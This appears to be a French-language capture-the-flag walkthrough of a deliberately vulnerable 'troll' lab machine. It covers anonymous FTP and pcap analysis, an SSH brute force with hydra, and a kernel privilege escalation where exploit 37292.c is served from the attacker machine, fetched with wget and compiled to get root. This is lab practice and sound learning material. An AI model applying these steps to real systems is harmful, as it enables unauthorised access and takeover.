TAGS : #WEB 
Legion (kali)
![[Pasted image 20231130084334.png|900]]

## Site web : 
![[Pasted image 20231130084420.png]]

# Découvertes de base : 
## Dirbuster : 
#### /secret/ : 
![[Pasted image 20231130085118.png]]
### /#wp-config.php\# : 
![[Pasted image 20231130085447.png]]

### /robots.txt : 


![[Pasted image 20231130085255.png]]


### <u><font style="color:red"> pas / peu interessant pour le moment, on passe à la suite</font></u>
# FTP : 
Logins:
-->ftp : ftp
-->ftp : b1uRR3
--> anonymous login

donc : 
	ftp 192.168.56.101
	USER anonymous
	dir
	get lol.pcap
Ensuite on quitte ftp 
	wireshark lol.pcap
	file->export objects->ftp-data ( = secret_stuff.txt )
	ou *tcpdump -nttttAr lol.pcap*
![[Pasted image 20231130090748.png]]
## Test web avec /sup3rs3cr3tdirlol/ : 

![[Pasted image 20231130090853.png]]

## Utilisation de la commande strings sur le fichier ( pour lire un fichier binaire ou executable ) : 

	strings roflmao

![[Pasted image 20231130091351.png]]
Adresse mémoire donc debugger oou assembleur mais ici machine débutante donc non ..
## Vérification site web : 
![[Pasted image 20231130091546.png]]
## Contenu des pages :
![[Pasted image 20231130091721.png]]
![[Pasted image 20231130091728.png]]

On dispose d'une liste d'utilisateur et un mot de passe, on essaye de se connecter à la machine avec SSH 
	hydra -L users -p pass 192.168.56.101 ssh --> Erreur car trop de requête, on supprime le début puis on retente
	Aucun mot de passe trouvé..
	Retour sur les deux pages web, vérification du code source, rien 




	![[Pasted image 20231130093909.png]]
	192.168.56.101/0x0856BF/this_folder_contains_the_password/***Pass.txt***

On repense au nom de la machine (troll) et on suis la logique du fichier ( ce_dossier_contient_le_mdp/***xxxx.txt***)
On ajoute Pass.txt à la liste des mots de passes et on retente.
Erreur ( trop de requêtes ) puis on retente comme avant en retirant une partie des mot de passes

![[Pasted image 20231130094106.png]]


### <strong><font style="color:red"  font size=4px>🟡🔰<u>élévation de privilèges</u>🔰🟡  </font></strong> 

Test si l'utilisalateur est dans les sudoers 
	sudo su

Récup version Linux : 
	uname -a
	
![[Pasted image 20231130111025.png]]
Recherche d'exploits pour la version de linux 
	searchsploit Linux 3.13 Privilege Escalation
	![[Pasted image 20231130111222.png]]

Copie de l'exploit 37292.c dans un serveur web ( machine attaquante )
	sudo cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/
Lancer apache

Sur la session ssh : 
	wget http://192.168.56.102/37292.c

![[Pasted image 20231130111900.png]]

Compilation et lancement du script : 
![[Pasted image 20231130111958.png]]
On est bien root.

  # <strong><font style="color:red"  font size=7px>🔴🎯<u>FLAG</u>🔴🎯 </font></strong> 

cd root
ls 
cat proof.txt 
> ![[Pasted image 20231130112216.png]]